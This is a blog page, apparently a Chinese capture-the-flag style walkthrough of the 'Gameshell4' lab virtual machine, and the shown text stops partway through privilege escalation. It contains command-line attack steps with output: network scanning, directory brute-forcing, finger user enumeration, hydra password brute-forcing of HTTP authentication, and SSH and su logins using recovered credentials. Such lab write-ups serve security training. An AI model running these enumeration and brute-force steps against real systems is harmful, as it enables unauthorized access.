@@ -1,0 +1,799 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Miao">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="靶机来源：QQ群-660930334 难度：Easy">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Mazesec_Gameshell4">
+<meta property="og:url" content="http://miao-sec.github.io/Maze-sec/Mazesec-Gameshell4/index.html">
+<meta property="og:site_name" content="Miao Blog">
+<meta property="og:description" content="靶机来源：QQ群-660930334 难度：Easy">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202603170953272.png">
+<meta property="og:image" content="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202603170954150.png">
+<meta property="og:image" content="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202603171117424.png">
+<meta property="og:image" content="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202603171130468.png">
+<meta property="article:published_time" content="2026-03-17T15:20:07.000Z">
+<meta property="article:modified_time" content="2026-03-17T15:22:10.217Z">
+<meta property="article:author" content="Miao">
+<meta property="article:tag" content="TCP79_Finger">
+<meta property="article:tag" content="HTTP认证">
+<meta property="article:tag" content="Sudo_uv">
+<meta property="article:tag" content="PATH劫持">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202603170953272.png">
+  
+  
+  
+  <title>Mazesec_Gameshell4 - Miao Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/glassBg.css">
+<link rel="stylesheet" href="/css/macBorder.css">
+<link rel="stylesheet" href="/css/scrollAnimation.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"miao-sec.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"|","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"#"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":"flase"},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"https://miaorj.oss-cn-chengdu.aliyuncs.com/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"W5UPQ7BHtxFTBIoh5xr1UWMt-gzGzoHsz","app_key":"WEHCtPWZ5dJRfC1hhVipHKwQ","server_url":"https://w5upq7bh.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body><!-- hexo injector body_begin start --><div id="web_bg"></div><!-- hexo injector body_begin end -->
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav
+  id="navbar"
+  class="navbar fixed-top navbar-expand-lg navbar-dark scrolling-navbar"
+>
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong class="navbar-title"
+        >Miaosec</strong
+      >
+    </a>
+
+    <button
+      id="navbar-toggler-btn"
+      class="navbar-toggler"
+      type="button"
+      data-toggle="collapse"
+      data-target="#navbarSupportedContent"
+      aria-controls="navbarSupportedContent"
+      aria-expanded="false"
+      aria-label="Toggle navigation"
+    >
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+            
+        <li class="nav-item">
+          <a
+            class="nav-link"
+            href="/"
+            target="_self"
+          >
+            <i class="iconfont icon-home-fill"></i>
+            <span>首页</span>
+          </a>
+        </li>
+             
+        <li class="nav-item">
+          <a
+            class="nav-link"
+            href="/archives/"
+            target="_self"
+          >
+            <i class="iconfont icon-archive-fill"></i>
+            <span>归档</span>
+          </a>
+        </li>
+             
+        <li class="nav-item">
+          <a
+            class="nav-link"
+            href="/categories/"
+            target="_self"
+          >
+            <i class="iconfont icon-category-fill"></i>
+            <span>分类</span>
+          </a>
+        </li>
+             
+        <li class="nav-item">
+          <a
+            class="nav-link"
+            href="/tags/"
+            target="_self"
+          >
+            <i class="iconfont icon-tags-fill"></i>
+            <span>标签</span>
+          </a>
+        </li>
+          
+        <li class="nav-item" id="search-btn">
+          <a
+            class="nav-link"
+            target="_self"
+            href="javascript:;"
+            data-toggle="modal"
+            data-target="#modalSearch"
+            aria-label="Search"
+          >
+            <i class="iconfont icon-search"></i>
+          </a>
+        </li>
+          
+        <li class="nav-item" id="color-toggle-btn">
+          <a
+            class="nav-link"
+            target="_self"
+            href="javascript:;"
+            aria-label="Color Toggle"
+          >
+            <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+          </a>
+        </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Mazesec_Gameshell4"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-03-17 23:20" pubdate>
+          2026年3月17日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.4k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          12 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Mazesec_Gameshell4</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>靶机来源：QQ群-<code>660930334</code></p>
+<p>难度：Easy</p>
+<span id="more"></span>
+
+<h1 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h1><h2 id="1、主机探测"><a href="#1、主机探测" class="headerlink" title="1、主机探测"></a>1、主机探测</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec]<br>└─# nmap -sn 192.168.2.0/24<br>Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-17 09:01 +0800<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.1<br>Host is up (0.00023s latency).<br>MAC Address: 0A:00:27:00:00:07 (Unknown)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.2<br>Host is up (0.00026s latency).<br>MAC Address: 08:00:27:8D:05:1E (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.88<br>Host is up (0.00040s latency).<br>MAC Address: 08:00:27:96:24:6F (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.4<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="hljs-keyword">in</span> 7.48 seconds<br></code></pre></td></tr></table></figure>
+
+<p>靶机IP：<code>192.168.2.88</code></p>
+<h2 id="2、端口扫描"><a href="#2、端口扫描" class="headerlink" title="2、端口扫描"></a>2、端口扫描</h2><h3 id="1-全端口扫描"><a href="#1-全端口扫描" class="headerlink" title="1.全端口扫描"></a>1.全端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec]<br>└─# nmap --min-rate 10000 -p- 192.168.2.88                   <br>Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-17 09:01 +0800<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.88<br>Host is up (0.00047s latency).<br>Not shown: 65532 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>79/tcp open  finger<br>80/tcp open  http<br>MAC Address: 08:00:27:96:24:6F (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 6.26 seconds<br></code></pre></td></tr></table></figure>
+
+<p>开放端口：<code>22、79、80</code></p>
+<h3 id="2-详细信息扫描"><a href="#2-详细信息扫描" class="headerlink" title="2.详细信息扫描"></a>2.详细信息扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec]<br>└─# nmap --min-rate 10000 -sT -sC -sV -O -p22,79,80 192.168.2.88<br>Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-17 09:02 +0800<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.88<br>Host is up (0.00100s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)<br>| ssh-hostkey: <br>|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)<br>|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)<br>|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)<br>79/tcp open  finger  OpenBSD fingerd (ported to Linux)<br>| finger: \x0D<br>| Welcome to Linux version 4.19.0-27-amd64 at GameShell4 !\x0D<br>| <br>|  21:03:09 up 4 min,  0 <span class="hljs-built_in">users</span>,  load average: 0.01, 0.08, 0.04<br>| \x0D<br>|_No one logged on.\x0D<br>80/tcp open  http    Apache httpd 2.4.62 ((Debian))<br>|_http-server-header: Apache/2.4.62 (Debian)<br>|_http-title: Hidden Server<br>MAC Address: 08:00:27:96:24:6F (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose|router<br>Running: Linux 4.X|5.X, MikroTik RouterOS 7.X<br>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3<br>OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)<br>Network Distance: 1 hop<br>Service Info: Host: GameShell4; OSs: Linux, Linux 4.19.0-27-amd64; CPE: cpe:/o:linux:linux_kernel, cpe:/o:linux:linux_kernel:4.19.0-27-amd64<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 21.19 seconds<br></code></pre></td></tr></table></figure>
+
+<h3 id="3-udp扫描"><a href="#3-udp扫描" class="headerlink" title="3.udp扫描"></a>3.udp扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec]<br>└─# nmap -sU --top-ports 100 192.168.2.88                       <br>Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-17 09:03 +0800<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.88<br>Host is up (0.0013s latency).<br>All 100 scanned ports on 192.168.2.88 are <span class="hljs-keyword">in</span> ignored states.<br>Not shown: 59 closed udp ports (port-unreach), 41 open|filtered udp ports (no-response)<br>MAC Address: 08:00:27:96:24:6F (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 59.27 seconds<br></code></pre></td></tr></table></figure>
+
+<h1 id="二、WEB渗透"><a href="#二、WEB渗透" class="headerlink" title="二、WEB渗透"></a>二、WEB渗透</h1><h2 id="1、80端口"><a href="#1、80端口" class="headerlink" title="1、80端口"></a>1、80端口</h2><p>访问80端口 <img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202603170953272.png" srcset="https://miaorj.oss-cn-chengdu.aliyuncs.com/img/loading.gif" lazyload alt="img"></p>
+<h2 id="2、目录扫描"><a href="#2、目录扫描" class="headerlink" title="2、目录扫描"></a>2、目录扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec]<br>└─# gobuster <span class="hljs-built_in">dir</span> -u http://192.168.2.88 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,js,txt,bak<br>===============================================================<br>Gobuster v3.8.2<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.168.2.88<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.8.2<br>[+] Extensions:              js,txt,bak,php,html<br>[+] Timeout:                 10s<br>===============================================================<br>Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>index.html           (Status: 200) [Size: 5431]<br>sudoku               (Status: 401) [Size: 459]<br>server-status        (Status: 403) [Size: 277]<br></code></pre></td></tr></table></figure>
+
+<p>找到一个<code>sudoku</code>，访问需要账号和密码 <img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202603170954150.png" srcset="https://miaorj.oss-cn-chengdu.aliyuncs.com/img/loading.gif" lazyload alt="img"></p>
+<h1 id="三、Finger用户枚举"><a href="#三、Finger用户枚举" class="headerlink" title="三、Finger用户枚举"></a>三、Finger用户枚举</h1><p><code>finger</code>用户枚举工具：<a target="_blank" rel="noopener" href="https://github.com/dev-angelist/Finger-User-Enumeration#">https://github.com/dev-angelist/Finger-User-Enumeration#</a> 需要对代码进行修改：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_valid_user</span>(<span class="hljs-params">output</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;Function to check if the user is valid by analyzing the output.&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;no such user.&quot;</span> <span class="hljs-keyword">in</span> output:<br>	    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>	<span class="hljs-keyword">else</span>:<br>		<span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <br>    <span class="hljs-comment">#if &quot;Login&quot; in output and &quot;Name&quot; in output and &quot;Super-User&quot; in output:</span><br>    <span class="hljs-comment">#    return True</span><br>    <span class="hljs-comment">#if &quot;ssh&quot; in output:</span><br>    <span class="hljs-comment">#    return True</span><br>    <span class="hljs-comment">#return False</span><br></code></pre></td></tr></table></figure>
+
+<p>对<code>finger</code>用户进行枚举</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec]<br>└─# python3 finger_user_enumeration.py -t 192.168.2.88 -w ../Tool/techyou.txt<br><br>[+] User found: admin@192.168.2.25<br><br>[!] 1 Users Found<br></code></pre></td></tr></table></figure>
+
+<p>查看返回的信息，确定最终的用户为<code>admin</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec]<br>└─# finger admin@192.168.2.88<br><br>Welcome to Linux version 4.19.0-27-amd64 at GameShell4 !<br><br> 21:33:27 up 34 min,  0 <span class="hljs-built_in">users</span>,  load average: 0.75, 3.20, 2.60<br><br>Login: admin                            Name: <br>Directory: /home/admin                  Shell: /bin/bash<br>Never logged <span class="hljs-keyword">in</span>.<br>No mail.<br>No Plan.<br></code></pre></td></tr></table></figure>
+
+<h1 id="四、HTTP认证服务爆破"><a href="#四、HTTP认证服务爆破" class="headerlink" title="四、HTTP认证服务爆破"></a>四、HTTP认证服务爆破</h1><p>使用<code>hydra</code>进行爆破</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec]<br>└─# hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.2.88 http-get /sudoku<br>Hydra v9.6 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please <span class="hljs-keyword">do</span> not use <span class="hljs-keyword">in</span> military or secret service organizations, or <span class="hljs-keyword">for</span> illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).<br><br>Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-17 10:33:03<br>[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore<br>[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task<br>[DATA] attacking http-get://192.168.2.88:80/sudoku<br>[STATUS] 7659.00 tries/min, 7659 tries <span class="hljs-keyword">in</span> 00:01h, 14336740 to <span class="hljs-keyword">do</span> <span class="hljs-keyword">in</span> 31:12h, 16 active<br>[STATUS] 7626.00 tries/min, 22878 tries <span class="hljs-keyword">in</span> 00:03h, 14321521 to <span class="hljs-keyword">do</span> <span class="hljs-keyword">in</span> 31:18h, 16 active<br>[STATUS] 7585.29 tries/min, 53097 tries <span class="hljs-keyword">in</span> 00:07h, 14291302 to <span class="hljs-keyword">do</span> <span class="hljs-keyword">in</span> 31:25h, 16 active<br>[80][http-get] host: 192.168.2.88   login: admin   password: babylove3<br>1 of 1 target successfully completed, 1 valid password found<br>Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-03-17 10:42:02<br></code></pre></td></tr></table></figure>
+
+<p>使用凭证进入到界面，发现是一个数独游戏，那就解一下 <img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202603171117424.png" srcset="https://miaorj.oss-cn-chengdu.aliyuncs.com/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202603171130468.png" srcset="https://miaorj.oss-cn-chengdu.aliyuncs.com/img/loading.gif" lazyload alt="img"> 解出后获取到一串字符串：<code>SUDOKUISMAGIC</code></p>
+<h1 id="五、获取admin权限"><a href="#五、获取admin权限" class="headerlink" title="五、获取admin权限"></a>五、获取admin权限</h1><p>使用获取到的凭证<code>admin:babylove3</code>成功获取到shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec]<br>└─# ssh admin@192.168.2.88     <br>admin@GameShell4:~$ <span class="hljs-built_in">id</span><br>uid=1004(admin) gid=1004(admin) <span class="hljs-built_in">groups</span>=1004(admin)<br></code></pre></td></tr></table></figure>
+
+<h1 id="六、权限提升"><a href="#六、权限提升" class="headerlink" title="六、权限提升"></a>六、权限提升</h1><h2 id="1、获取xcm权限"><a href="#1、获取xcm权限" class="headerlink" title="1、获取xcm权限"></a>1、获取xcm权限</h2><p>查看<code>/home</code>目录，发现存在其余两个用户</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">admin@GameShell4:~$ <span class="hljs-built_in">ls</span> -la /home<br>total 20<br>drwxr-xr-x  5 root  root  4096 Dec  1 07:42 .<br>drwxr-xr-x 18 root  root  4096 Mar 18  2025 ..<br>drwx------  2 admin admin 4096 Dec  1 08:13 admin<br>drwx------  2 sdk   sdk   4096 Dec  1 08:13 sdk<br>drwx------  2 xcm   xcm   4096 Dec  3 08:25 xcm<br></code></pre></td></tr></table></figure>
+
+<p>经过测试发现，使用密码<code>sudokuismagic</code>能成功切换到xcm用户</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">admin@GameShell4:~$ su xcm<br>Password: sudokuismagic<br>xcm@GameShell4:/home/admin$ <span class="hljs-built_in">id</span><br>uid=1003(xcm) gid=1003(xcm) <span class="hljs-built_in">groups</span>=1003(xcm)<br></code></pre></td></tr></table></figure>
+
+<h2 id="2、获取sdk权限"><a href="#2、获取sdk权限" class="headerlink" title="2、获取sdk权限"></a>2、获取sdk权限</h2><p>查看sudo -l</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">xcm@GameShell4:/$ <span class="hljs-built_in">sudo</span> -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> xcm on GameShell4:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/usr/games<br><br>User xcm may run the following commands on GameShell4:<br>    (sdk) NOPASSWD: /usr/local/bin/uv init *, /usr/local/bin/uv <span class="hljs-built_in">help</span> *<br></code></pre></td></tr></table></figure>
+
+<p>查看suid文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">xcm@GameShell4:/$ find / -perm -4000 2&gt;/dev/null<br>/usr/bin/chsh<br>/usr/bin/chfn<br>/usr/bin/newgrp<br>/usr/bin/gpasswd<br>/usr/bin/mount<br>/usr/bin/su<br>/usr/bin/umount<br>/usr/bin/pkexec<br>/usr/bin/sudo<br>/usr/bin/passwd<br>/usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>/usr/lib/eject/dmcrypt-get-device<br>/usr/lib/openssh/ssh-keysign<br>/usr/libexec/polkit-agent-helper-1<br>/opt/revive<br></code></pre></td></tr></table></figure>
+
+<p>发现<code>/opt/revive</code>具有suid权限</p>
+<p>查看文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">xcm@GameShell4:/$ strings /opt/revive <br>/lib64/ld-linux-x86-64.so.2<br>setuid<br><span class="hljs-built_in">exit</span><br>fopen<br><span class="hljs-built_in">unlink</span><br><span class="hljs-built_in">chmod</span><br>fgets<br>strstr<br>fputc<br>fputs<br>fclose<br>stderr<br>fwrite<br>rename<br>geteuid<br>fprintf<br>__cxa_finalize<br>__libc_start_main<br>....<br></code></pre></td></tr></table></figure>
+
